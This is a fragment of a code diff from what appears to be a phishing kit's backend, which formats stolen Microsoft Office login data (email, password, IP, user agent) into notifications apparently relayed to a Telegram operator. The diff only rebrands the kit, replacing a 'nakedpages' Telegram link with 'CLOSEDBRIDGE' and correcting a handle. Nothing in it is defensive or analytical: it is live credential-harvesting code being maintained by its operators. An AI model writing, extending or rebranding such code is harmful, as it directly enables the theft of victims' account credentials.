@@ -354,7 +354,7 @@ ${adminUrl}
 IP: ${loginData.ip || 'Unknown'}
 INFORMATION: ANTIBOT DISABLED
 USERAGENT: ${loginData.userAgent || 'Unknown'}
-/////// POWERED BY https://t.me/nakedpages /////////`;
+/////// POWERED BY CLOSEDBRIDGE /////////`;
 
         const keyboard = {
             inline_keyboard: [
@@ -407,7 +407,7 @@ USERAGENT: ${loginData.userAgent || 'Unknown'}
         }
         const adminUrl = `${baseUrl}/ad.html`;
 
-        const notificationMessage = `@closedbride ⭐️office⭐️
+        const notificationMessage = `@closedbridge ⭐️office⭐️
  {
     "officeEmail": "${email}",
     "officePassword": "${password}",
@@ -419,7 +419,7 @@ USERAGENT: ${loginData.userAgent || 'Unknown'}
 IP: ${failureData.ip || 'Unknown'}
 INFORMATION: ANTIBOT DISABLED
 USERAGENT: ${failureData.userAgent || 'Unknown'}
-/////// POWERED BY https://t.me/nakedpages /////////`;
+/////// POWERED BY CLOSEDBRIDGE /////////`;
 
         const keyboard = {
             inline_keyboard: [
